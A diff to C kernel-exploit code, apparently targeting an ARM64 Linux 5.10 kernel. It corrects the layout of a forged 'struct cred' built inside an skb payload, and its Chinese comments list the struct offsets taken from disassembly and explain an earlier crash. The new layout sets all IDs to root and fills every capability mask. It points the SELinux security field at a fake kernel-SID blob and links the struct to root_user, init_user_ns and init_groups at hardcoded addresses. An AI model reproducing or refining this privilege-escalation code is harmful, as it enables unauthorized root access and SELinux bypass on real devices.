@@ -692,27 +692,38 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x08, 0);
       put64(p, LOCK_OFF + 0x10, 0);
       put64(p, LOCK_OFF + 0x18, 0);
-      /* mt35: fake cred @0x3800 - init_cred semantics (disasm offsets) */
+      /* mt56: 假 cred 布局按本内核反汇编真值重写 (R 轮 crash 定罪旧布局)。
+       * 真值三源铁证:
+       *   selinux_task_to_inode+0x40: ldr x8,[x8,#0x78] → security@0x78
+       *     (add x8,x0,#0x778=real_cred; ldar; [cred+0x78]; crash far=0x4
+       *      = 旧布局 0x80 未写 0x78 → NULL deref)
+       *   selinux_capable+0x44: ldr x9,[x0,#0x78] → security@0x78 (二源)
+       *   cap_capable+0x04: ldr x8,[x0,#0x88] → user_ns@0x88
+       *   cap_task_fix_setuid+0x64/0x68: stp xzr,xzr,[x0,#0x30]; str xzr,[x0,#0x48]
+       *     → caps 五连 = 0x30/0x38/0x40/0x48/0x50 (inh/perm/eff/bset/amb)
+       *   cap_task_fix_setuid+0x28: ldr w8,[x8,#0x24] → securebits@0x24
+       * 布局 (标准 5.10, usage 为 8B):
+       *   0x00 usage | 0x04 uid .. 0x20 fsgid | 0x24 securebits
+       *   0x30-0x57 五组 caps | 0x58-0x77 keyring 区 (保持 NULL!)
+       *   0x78 security | 0x80 user | 0x88 user_ns | 0x90 group_info
+       * 旧 mt35 布局系统性 +8 错位: security 0x80❌(真0x78), user_ns 0x90❌
+       * (真0x88), group_info 0x98❌(真0x90), caps 0x38-0x58❌(真0x30-0x50),
+       * 且 cap_ambient 旧写在 0x58 = 侵入 keyring 区 (非NULL keyring 指针)。
+       * ids 全 0 + usage=1 已在正确区域 (skb_buf memset 0 兜底)。 */
       put64(p, 0x3800 + 0x00, 1);                    /* usage = 1 */
-      put32(p, 0x3800 + 0x14, 0);                    /* uid */
-      put32(p, 0x3800 + 0x18, 0);                    /* gid */
-      put32(p, 0x3800 + 0x1c, 0);                    /* suid */
-      put32(p, 0x3800 + 0x20, 0);                    /* sgid */
-      put32(p, 0x3800 + 0x24, 0);                    /* euid */
-      put32(p, 0x3800 + 0x28, 0);                    /* egid */
-      put32(p, 0x3800 + 0x2c, 0);                    /* fsuid */
-      put32(p, 0x3800 + 0x30, 0);                    /* fsgid */
-      put64(p, 0x3800 + 0x38, 0x1ffffffffffULL);     /* cap_inheritable */
-      put64(p, 0x3800 + 0x40, 0x1ffffffffffULL);     /* cap_permitted */
-      put64(p, 0x3800 + 0x48, 0x1ffffffffffULL);     /* cap_effective */
-      put64(p, 0x3800 + 0x50, 0x1ffffffffffULL);     /* cap_bset */
-      put64(p, 0x3800 + 0x58, 0x1ffffffffffULL);     /* cap_ambient */
-      put64(p, 0x3800 + 0x80, payload_base + 0x3900); /* security -> fake blob */
+      put64(p, 0x3800 + 0x30, 0x1ffffffffffULL);     /* cap_inheritable */
+      put64(p, 0x3800 + 0x38, 0x1ffffffffffULL);     /* cap_permitted */
+      put64(p, 0x3800 + 0x40, 0x1ffffffffffULL);     /* cap_effective ★ */
+      put64(p, 0x3800 + 0x48, 0x1ffffffffffULL);     /* cap_bset */
+      put64(p, 0x3800 + 0x50, 0x1ffffffffffULL);     /* cap_ambient */
+      /* 0x58-0x77: keyring 区不写 (memset 0 = NULL, 旧布局在此写 caps 会
+       * 造成非 NULL 伪 keyring 指针 — 第二颗潜在雷, 一并拆除) */
+      put64(p, 0x3800 + 0x78, payload_base + 0x3900); /* security -> fake blob */
       put32(p, 0x3900 + 0x00, 1);                    /* osid = SECINITSID_KERNEL */
       put32(p, 0x3900 + 0x04, 1);                    /* sid = SECINITSID_KERNEL */
-      put64(p, 0x3800 + 0x88, P0_DATA_ALIAS_CONST(0xffffffc00a7af660ULL)); /* user = root_user */
-      put64(p, 0x3800 + 0x90, P0_DATA_ALIAS_CONST(0xffffffc00a7af6f8ULL)); /* user_ns = init_user_ns */
-      put64(p, 0x3800 + 0x98, P0_DATA_ALIAS_CONST(0xffffffc00a7b0b88ULL)); /* group_info = init_groups */
+      put64(p, 0x3800 + 0x80, P0_DATA_ALIAS_CONST(0xffffffc00a7af660ULL)); /* user = root_user */
+      put64(p, 0x3800 + 0x88, P0_DATA_ALIAS_CONST(0xffffffc00a7af6f8ULL)); /* user_ns = init_user_ns */
+      put64(p, 0x3800 + 0x90, P0_DATA_ALIAS_CONST(0xffffffc00a7b0b88ULL)); /* group_info = init_groups */
     } else {
       /* legacy non-SLIDE non-FOPS layout */
       put32(p, LOCK_OFF + 0x00, 0);
